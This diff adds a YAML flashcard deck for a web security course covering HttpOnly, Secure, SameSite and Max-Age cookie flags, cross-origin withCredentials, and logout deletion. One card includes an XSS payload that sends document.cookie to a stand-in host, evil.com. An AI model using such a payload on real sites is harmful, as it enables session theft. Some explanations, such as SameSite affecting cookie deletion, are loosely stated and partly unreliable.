@@ -1,0 +1,100 @@
+id: httponly-cookies
+name: "HttpOnly cookies — auth flow and flags"
+tags: [HttpOnly, cookies, token, SameSite, Secure, XSS, withCredentials]
+prose: "An HttpOnly cookie stores a session token in the browser where JavaScript cannot read it, eliminating the XSS attack surface for token theft. The Secure, SameSite, and Max-Age flags work alongside HttpOnly to restrict transmission, control cross-site sending, and bound the session lifetime."
+
+cards:
+  - id: httponly-cookies-card-01
+    type: cloze
+    prompt: "Setting the {{HttpOnly}} flag blocks JavaScript from reading the cookie value, preventing XSS-based token theft."
+    answer: "HttpOnly"
+    explanation: "When HttpOnly is set, the browser manages the cookie entirely. No script on the page — including injected Cross-Site Scripting (XSS) payloads — can call document.cookie to retrieve the token value, removing the primary attack vector for session hijacking via script injection."
+    example: |
+      Set-Cookie: token=abc123; HttpOnly; Path=/; SameSite=None; Secure
+      # document.cookie returns "" — the token is invisible to JavaScript
+    source: "Slide 9, Slide 10, ISAQuiz11"
+    bloom: remember
+
+  - id: httponly-cookies-card-02
+    type: cloze
+    prompt: "The {{Secure}} cookie flag restricts the cookie to HTTPS connections only, preventing transmission over plain HTTP."
+    answer: "Secure"
+    explanation: "Without the Secure flag, the browser sends the cookie over both HTTP and HTTPS. An attacker on an unencrypted network can intercept the cookie in plaintext. The Secure flag ensures the cookie only travels over encrypted connections."
+    example: |
+      Set-Cookie: token=abc123; HttpOnly; Path=/; SameSite=None; Secure
+      # Browser refuses to send this cookie over http://
+      # Browser sends it over https:// only
+    source: "Slide 9, Slide 10, ISAQuiz11"
+    bloom: remember
+
+  - id: httponly-cookies-card-03
+    type: name
+    prompt: "What are ALL the risks of not setting the HttpOnly attribute on a session cookie? (ISAQuiz11 Q3)"
+    answer: "All of them: XSS token theft, session hijacking, AND CSRF attacks."
+    explanation: "HttpOnly removes JavaScript read access, which stops XSS-based theft. Without it, any injected script can read and exfiltrate the token (XSS theft), impersonate the user indefinitely (session hijacking), and the stolen token can be replayed cross-site (CSRF). Selecting only XSS scores zero — the flags work as a system, and removing one opens multiple vectors."
+    example: |
+      # Without HttpOnly:
+      # Attacker injects: <script>fetch('evil.com?t='+document.cookie)</script>
+      # Result: token stolen → session hijacked → cross-site replay possible
+    source: "Slide 9, Slide 10, ISAQuiz11"
+    bloom: analyze
+
+  - id: httponly-cookies-card-04
+    type: cloze
+    prompt: "For a cross-origin XMLHttpRequest to send an HttpOnly cookie, the client must set {{withCredentials}} to true AND the server must respond with {{Access-Control-Allow-Credentials}}: true."
+    answer: "withCredentials; Access-Control-Allow-Credentials"
+    explanation: "Same-origin requests always send cookies automatically. Cross-origin requests strip cookies by default. Both conditions must hold simultaneously: the client opts in with withCredentials, and the server opts in with the CORS credential header. Either condition alone is insufficient — the browser discards the response if the server header is missing even when the client set withCredentials."
+    example: |
+      // Client (cross-origin XHR)
+      const xhr = new XMLHttpRequest();
+      xhr.withCredentials = true;
+      xhr.open('GET', 'https://api.example.com/profile');
+      xhr.send();
+
+      // Server must include in response:
+      // Access-Control-Allow-Credentials: true
+    source: "Slide 9, Slide 10, ISAQuiz11"
+    bloom: apply
+
+  - id: httponly-cookies-card-05
+    type: predict
+    prompt: "A client makes a cross-origin XMLHttpRequest to GET /profile. withCredentials is not set (defaults to false). The server has a valid HttpOnly session cookie for this user. Predict what the server receives and why."
+    answer: "The server receives no cookie. The browser strips all cookies from cross-origin requests when withCredentials is false. The server cannot identify the user and returns 401 Unauthorized."
+    explanation: "The Same-Origin Policy causes the browser to remove credentials (cookies and auth headers) from cross-origin requests unless the client explicitly opts in with withCredentials. The HttpOnly flag is irrelevant here — the cookie exists in the browser but the browser refuses to attach it to the cross-origin request."
+    example: |
+      // withCredentials omitted — defaults to false
+      const xhr = new XMLHttpRequest();
+      xhr.open('GET', 'http://api.otherdomain.com/profile');
+      xhr.send();
+      // Cookie header: absent
+      // Server response: 401 Unauthorized
+    source: "Slide 9, Slide 10, ISAQuiz11"
+    bloom: apply
+
+  - id: httponly-cookies-card-06
+    type: cloze
+    prompt: "To delete an HttpOnly cookie on logout, the server sets {{Max-Age=0}} in the Set-Cookie header. All other attributes must match the original cookie exactly."
+    answer: "Max-Age=0"
+    explanation: "The browser matches a Set-Cookie deletion directive against the stored cookie using its name, Path, Domain, and SameSite attributes. If any attribute differs, the browser treats the directive as a new cookie rather than a deletion of the existing one, leaving the original session cookie intact. Max-Age=0 is the mechanism that signals immediate deletion."
+    example: |
+      # Login sets:
+      Set-Cookie: token=R99R; HttpOnly; Path=/; SameSite=None; Secure; Max-Age=60
+
+      # Logout must send — all attributes matching:
+      Set-Cookie: token=; HttpOnly; Path=/; Max-Age=0; SameSite=None; Secure
+    source: "Slide 9, Slide 10, ISAQuiz11"
+    bloom: apply
+
+  - id: httponly-cookies-card-07
+    type: name
+    prompt: "What does SameSite=None require, and why does the requirement exist?"
+    answer: "SameSite=None requires the Secure flag to also be set. Without Secure, browsers reject the SameSite=None directive entirely."
+    explanation: "SameSite=None allows the cookie to be sent on cross-origin requests. Browsers enforce that this permissive setting is paired with HTTPS-only transmission to prevent the cookie from traveling over an unencrypted channel where cross-site delivery would also expose it to interception."
+    example: |
+      # Valid — browser accepts and sends cross-origin:
+      Set-Cookie: token=abc; SameSite=None; Secure; HttpOnly
+
+      # Invalid — browser ignores or rejects:
+      Set-Cookie: token=abc; SameSite=None; HttpOnly
+    source: "Slide 9, Slide 10, ISAQuiz11"
+    bloom: understand
